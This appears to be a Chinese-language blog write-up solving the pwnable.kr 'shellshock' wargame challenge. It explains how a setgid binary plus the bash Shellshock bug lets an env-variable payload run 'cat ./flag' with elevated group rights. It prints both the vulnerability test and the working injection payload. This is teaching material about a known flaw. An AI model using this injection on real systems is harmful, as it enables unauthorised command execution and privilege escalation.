---
layout: post
title: pwnable.kr - Shell Shock
slug: pwnable.kr - Shell Shock
category: PWN
published: true
---

pwnable.kr - shellshock

```bash
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```

#### 一、用户权限问题

Linux下文件的权限查看:

```
shellshock@pwnable:~$ ls -al
total 980
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
```

可以看到`flag`是需要shellshock_pwn的权限才能读取的。

source code:

```bash
shellshock@pwnable:~$ cat shellshock.c
#include <stdio.h>
int main(){
 setresuid(getegid(), getegid(), getegid());
 setresgid(getegid(), getegid(), getegid());
 system("/home/shellshock/bash -c 'echo shock_me'");
 return 0;
}
```

`setresuid`和`setresgid`的作用：

 setresuid() sets the real user ID, the effective user ID, and the
    saved set-user-ID of the calling process.

 setresuid() sets the real user ID, the effective user ID, and the
       saved set-user-ID of the calling process.

这两个函数的参数都是`getegid()`，也就是`shellshock_pwn`，所以执行到`system`时已经具有`shellshock_pwn`的权限了。

#### SHELL SHOCK

需要利用到的是bash在4.1以下版本的一个漏洞**shellshock**，文末附相关资料。可以测试下是否有该漏洞：

```bash
env x='() { :;}; echo vulnerable' ./bash -c "cat ./flag"
```

如果打印了`vulnerable`,就说明有该漏洞了。

解释下这个漏洞的一些涉及点：

1. bash中支持自定义函数，使用函数名即可调用
2. `initialize_shell_variables`这个函数用于遍历并解析当前环境变量，是在bash运行程序时执行的
3. `initialize_shell_variables`解析逻辑存在漏洞，特定格式的环境变量的值可以注入代码执行
4. 特定格式： `env x='() { :;}; bash -c "cat ./flag"`。这个值在解析时候会执行`bash -c "cat ./flag"`

#### PWN

如何通过这个漏洞读取flag，就是执行`shellshock程序`，该程序中有一行系统调用`system("/home/shellshock/bash -c 'echo shock_me'");`，这会导致环境变量被遍历并解析，而此时又已经有读取`flag`的权限了。

所以最后的payload:

```bash
env x='() { :;}; bash -c "cat ./flag"' ./shellshock
```

#### Reference

[ShellShock漏洞原理分析](https://developer.aliyun.com/article/53608)
